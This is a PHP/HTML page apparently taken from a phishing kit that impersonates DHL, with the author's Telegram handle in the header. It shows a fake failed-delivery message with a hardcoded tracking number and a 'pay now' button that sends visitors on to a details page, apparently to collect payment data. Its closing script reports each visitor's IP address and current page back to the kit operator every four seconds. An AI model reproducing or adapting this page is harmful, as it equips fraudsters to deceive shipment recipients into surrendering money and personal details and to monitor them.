<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    $_SESSION['last_page'] = "msg";

?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="DHL">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>DHL</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
    </head>
    <body>

    
    <!-- header -->
     <header class="header_1">
      <div class="container_header_1 d-flex align-items-center justify-content-between">
        <div class="logo">
          <img src="<?php echo IMGSPATH; ?>/dhl-logo.svg" alt="">
        </div>
        <div class="links_1">
          <ul class="mb-0 ps-0 d-flex align-items-center">
            <li><i class="fa-solid fa-magnifying-glass search"></i> <?php echo get_text('head_1'); ?></li>
            <li data-lang="en" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] == 'en' ) { echo 'active'; } ?>">EN</li>
            <li data-lang="<?php echo $_SESSION['lang']; ?>" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] !== 'en' ) { echo 'active'; } ?>"><?php echo $_SESSION['lang']; ?></li>
          </ul>
        </div>
        <img src="<?php echo IMGSPATH; ?>/bars.png" class="bars" alt="">
      </div>
     </header>
     <div class="some_linsk">
      <div class="container_some_links d-flex justify-content-between align-items-center">
        <div class="part_left">
          <ul class="mb-0 ps-0 d-flex align-items-center">
            <li><i class="fa-solid fa-magnifying-glass search"></i> <?php echo get_text('head_1'); ?></li>
            <li data-lang="en" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] == 'en' ) { echo 'active'; } ?>">EN</li>
            <li data-lang="<?php echo $_SESSION['lang']; ?>" style="text-transform: uppercase;" class="lang <?php if( $_SESSION['lang'] !== 'en' ) { echo 'active'; } ?>"><?php echo $_SESSION['lang']; ?></li>
          </ul>
        </div>
        <div class="part_right">
          <ul class="ps-0 mb-0 d-flex align-items-center">
            <li><a href=""><?php echo get_text('mainmenu_5'); ?></a> <img src="<?php echo IMGSPATH; ?>/arrow.png" alt=""></li>
          </ul>
        </div>
      </div>
     </div>

     <!-- wrapper_message -->
      <div class="wrapper_message">
        <div class="container_message">
          <div class="title">
            <h1><?php echo get_text('msg_title'); ?></h1>
          </div>
          <div class="boxes d-flex align-items-start d-flex">
            <div class="part_left">
              <div class="message">
                <div class="top_box d-flex justify-content-between">
                  <div class="part_left_box">
                    <span><?php echo get_text('from1'); ?></span>
                    <p class="mb-0"><?php echo get_text('from2'); ?></p>
                    <span>9555648992661</span>
                  </div>
                  <div class="part_right_box">
                    <span><?php echo get_text('ship_close'); ?> </span>
                    <p class="mb-0 date"><?php echo calculateDateMines3Days(); ?></p>
                  </div>
                </div>
                <div class="steps">
                  <ul class="d-flex mb-0 ps-0 align-items-center justify-content-between">
                    <li class="d-flex align-items-start"><div class="bolid"></div> <p class="mb-0"><?php echo get_text('step_1'); ?></p></li>
                    <li><div class="bolid"></div> <p class="mb-0"><?php echo get_text('step_2'); ?></p></li>
                    <li><div class="forg"><i class="ri-close-line"></i></div> <p class="active mb-0"><?php echo get_text('step_3'); ?></p></li>
                    <li class="d-flex align-items-end"><div class="end_deliv"></div> <p class="mb-0"><?php echo get_text('step_4'); ?></p></li>
                  </ul>
                </div>
                <div class="infos">
                  <h1><?php echo get_text('msg_title'); ?></h1>
                  <p class="mb-0"><?php echo get_text('msg_text_1'); ?></p>
                  <p class="txt_bold"><?php echo get_text('msg_text_2'); ?></p>
                  <div class="alert_box">
                    <p><?php echo get_text('msg_note'); ?></p>
                  </div>
                </div>
                <div class="btns">
                  <button type="button" class="go"><?php echo get_text('pay_now'); ?></button>
                </div>
              </div>
            </div>
            <div class="part_right">
              <div class="box capitan">
                <div class="title_box">
                  <h5 class="mb-0"><?php echo get_text('side1_title'); ?> <img src="<?php echo IMGSPATH; ?>/arrow_left.png" alt=""></h5>
                </div>
                <p class="mb-0"><?php echo get_text('side1_text'); ?></p>
              </div>
              <div class="box">
                <div class="title_box">
                  <h5 class="mb-0"><?php echo get_text('side2_title'); ?> <img src="<?php echo IMGSPATH; ?>/arrow_left.png" alt=""></h5>
                </div>
                <p class="mb-0"><?php echo get_text('side2_text'); ?></p>
              </div>
            </div>
          </div>
        </div>
      </div>

    <!-- Packages -->
     <div class="Packages">
      <div class="container_Packages">
        <div class="title">
          <h1><?php echo get_text('boxes_title'); ?></h1>
        </div>
        <div class="wrapper_boxes">
          <div class="box_pack">
            <div class="title_pack">
              <img src="<?php echo IMGSPATH; ?>/x1.svg" alt="">
              <p class="mb-0"><?php echo get_text('box1_title'); ?></p>
            </div>
            <p class="txt"><?php echo get_text('box1_text1'); ?></p>
            <hr>
            <div class="infos">
              <div class="title_info">
                <p class="mb-0"><?php echo get_text('box1_text2'); ?></p>
                <span><?php echo get_text('box1_text3'); ?></span>
              </div>
            </div>
            <div class="options">
              <div class="option d-flex align-items-center">
                <img src="<?php echo IMGSPATH; ?>/mess.svg" alt="">
                <p class="mb-0"><?php echo get_text('box1_text4'); ?></p>
              </div>
              <div class="option d-flex align-items-center">
                <img src="<?php echo IMGSPATH; ?>/ask.svg" alt="">
                <p class="mb-0"><?php echo get_text('box1_text5'); ?></p>
              </div>
            </div>
          </div>
          <div class="box_pack">
            <div class="title_pack">
              <img src="<?php echo IMGSPATH; ?>/x2.svg" alt="">
              <p class="mb-0"><?php echo get_text('box2_title'); ?></p>
            </div>
            <p class="txt"><?php echo get_text('box2_text1'); ?></p>
            <hr>
            <div class="infos">
              <div class="title_info">
                <p class="mb-0"><?php echo get_text('box2_text2'); ?></p>
                <span><?php echo get_text('box2_text3'); ?></span>
              </div>
            </div>
            <div class="options">
              <div class="option d-flex align-items-center">
                <img src="<?php echo IMGSPATH; ?>/mess.svg" alt="">
                <p class="mb-0"><?php echo get_text('box2_text4'); ?></p>
              </div>
              <div class="option d-flex align-items-center">
                <img src="<?php echo IMGSPATH; ?>/ask.svg" alt="">
                <p class="mb-0"><?php echo get_text('box2_text5'); ?></p>
              </div>
            </div>
          </div>
        </div>
      </div>
     </div>


    <!-- footer -->
      <footer class="footer_1">
        <div class="contianer_footer_1">
          <div class="row w-100 mx-auto">
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span class="active"><?php echo get_text('footer_title_1'); ?></span>
                <li><?php echo get_text('f_w_1_1'); ?></li>
                <li><?php echo get_text('f_w_1_2'); ?></li>
                <li><?php echo get_text('f_w_1_3'); ?></li>
                <li><?php echo get_text('f_w_1_4'); ?></li>
                <li><?php echo get_text('f_w_1_5'); ?></li>
                <li><?php echo get_text('f_w_1_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_2'); ?></span>
                <li><?php echo get_text('f_w_2_1'); ?></li>
                <li><?php echo get_text('f_w_2_2'); ?></li>
                <li><?php echo get_text('f_w_2_3'); ?></li>
                <li><?php echo get_text('f_w_2_4'); ?></li>
                <li><?php echo get_text('f_w_2_5'); ?></li>
                <li><?php echo get_text('f_w_2_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_3'); ?></span>
                <li><?php echo get_text('f_w_3_1'); ?></li>
                <li><?php echo get_text('f_w_3_2'); ?></li>
                <li><?php echo get_text('f_w_3_3'); ?></li>
                <li><?php echo get_text('f_w_3_4'); ?></li>
                <li><?php echo get_text('f_w_3_5'); ?></li>
                <li><?php echo get_text('f_w_3_6'); ?></li>
              </ul>
            </div>
            <div class="col-md-3">
              <ul class="mb-0 ps-0">
                <span><?php echo get_text('footer_title_4'); ?></span>
                <li><?php echo get_text('f_w_4_1'); ?></li>
                <li><?php echo get_text('f_w_4_2'); ?></li>
                <li><?php echo get_text('f_w_4_3'); ?></li>
                <li><?php echo get_text('f_w_4_4'); ?></li>
                <li><?php echo get_text('f_w_4_5'); ?></li>
                <li><?php echo get_text('f_w_4_6'); ?></li>
                <li><?php echo get_text('f_w_4_7'); ?></li>
                <li><?php echo get_text('f_w_4_8'); ?></li>
              </ul>
            </div>                                    
          </div>
        </div>
        <div class="container_copyghit">
          <div class="container_top_copyghit d-flex justify-content-between">
            <div class="part_left">
              <img src="<?php echo IMGSPATH; ?>/glo-footer-logo.svg" alt="">
              <ul class="d-flex align-items-center ps-0 mb-0">
                <li><?php echo get_text('foot_1'); ?></li>
                <li><?php echo get_text('foot_2'); ?></li>
                <li><?php echo get_text('foot_3'); ?></li>
                <li><?php echo get_text('foot_4'); ?></li>
                <li><?php echo get_text('foot_5'); ?></li>
                <li><?php echo get_text('foot_6'); ?></li>
                <li><?php echo get_text('foot_7'); ?></li>
              </ul>
            </div>
            <div class="part_right">
              <h1><?php echo get_text('followus'); ?></h1>
              <img src="<?php echo IMGSPATH; ?>/socil.png" class="social2" alt="">
              <img src="<?php echo IMGSPATH; ?>/social1.png" class="social1" alt="">
            </div>            
          </div>
          <div class="txt_copyght">
            <p class="mb-0"><?php echo get_text('copyright'); ?></p>
          </div>
        </div>
      </footer>






    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="<?php echo JSPATH; ?>/js.js"></script>
    
    <script>        
            $(".go").click(function(){
              window.location.href ="index.php?redirection=details";
            });

            $(".lang").click(function(){
              var lang = $(this).data('lang');
              window.location.href ="index.php?lang=" + lang;
            });
            
            

            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'msg'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);  

    </script>
    </body>
</html>